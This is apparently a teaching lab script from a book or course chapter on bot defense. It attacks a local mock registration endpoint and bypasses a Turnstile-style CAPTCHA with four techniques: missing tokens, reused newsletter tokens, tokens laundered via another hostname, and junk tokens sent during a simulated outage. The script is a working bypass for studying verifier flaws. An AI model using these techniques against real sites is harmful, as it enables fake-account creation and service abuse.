"""
Chapter 6, Round 1 attack: get past the CAPTCHA without solving it (section 6.2).

Rung 0 of the attack ladder: don't solve the puzzle, find the integration bug. Four techniques,
five sign-ups each:

  missing      no token at all ("the widget failed to load")
  newsletter   a token from the newsletter form. That widget never shows a puzzle, so tokens are
               free; only the `action` says "newsletter".
  laundered    a token minted for YOUR sitekey on the attacker's own page (hostname
               free-movies.example), where unsuspecting visitors pass the widget for them.
               Sitekeys are public.
  outage       during a provider incident, any junk token. The script simulates the incident
               with the mock's /lab/chaos endpoint (scoped to this bot's IP, so the shoppers
               running next to it are not caught in it).

None of these pays a solving farm. That is the point: they cost ~nothing.

Expected:
  DEFENSE_LEVEL=1, shipped verifier   20/20 accounts (all four work)
  DEFENSE_LEVEL=1, fixed verifier     0/20, with a distinct turnstile_reason per technique

Rules of engagement: a bot may mint tokens for non-interactive actions (newsletter) and for
other hostnames. Interactive tokens for this site cost money: they come only from attacks/farm.py.

    python attacks/round1_bypass.py
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import labclient  # noqa: E402,F401  (the localhost guard runs on import)
import captcha_kit as ck  # noqa: E402

PER_TECHNIQUE = 5


def token_for(technique, ip):
    if technique == "missing":
        return ""
    if technique == "newsletter":
        return ck.mint_token(ip, "newsletter")
    if technique == "laundered":
        return ck.mint_token(ip, "register", hostname="free-movies.example")
    if technique == "outage":
        return "0.not-a-real-token"
    raise ValueError(technique)


def run():
    results = {}
    for technique in ("missing", "newsletter", "laundered", "outage"):
        c = ck.bot(f"bypass_{technique}")
        ip = c.ip
        if technique == "outage":
            ck.provider_chaos("error", seconds=30, ip=ip)
        ok = 0
        for i in range(PER_TECHNIQUE):
            body = {"email": ck.new_email(f"{technique}{i}"), "password": "hunter2-hunter2", "name": "Bot"}
            if technique != "missing":
                body["cf-turnstile-response"] = token_for(technique, ip)
            ok += ck.post_json(c, "/api/register", body).status_code == 201
        if technique == "outage":
            ck.provider_chaos("ok")
        results[technique] = {"succeeded": ok, "reasons": ck.reasons(c.actor, "turnstile_reason")}
    return ck.report("round1_bypass", 4 * PER_TECHNIQUE, sum(v["succeeded"] for v in results.values()), techniques=results)


if __name__ == "__main__":
    s = run()
    print("=== Round 1: CAPTCHA bypass without solving ===")
    for technique, v in s["techniques"].items():
        print(f"  {technique:<11} {v['succeeded']}/{PER_TECHNIQUE} accounts"
              + (f"   refused: {'; '.join(v['reasons'])}" if v["reasons"] else ""))
    print(f"  total: {s['succeeded']}/{s['attempted']} fake accounts, $0.00 spent on solving")
    ck.emit(s)
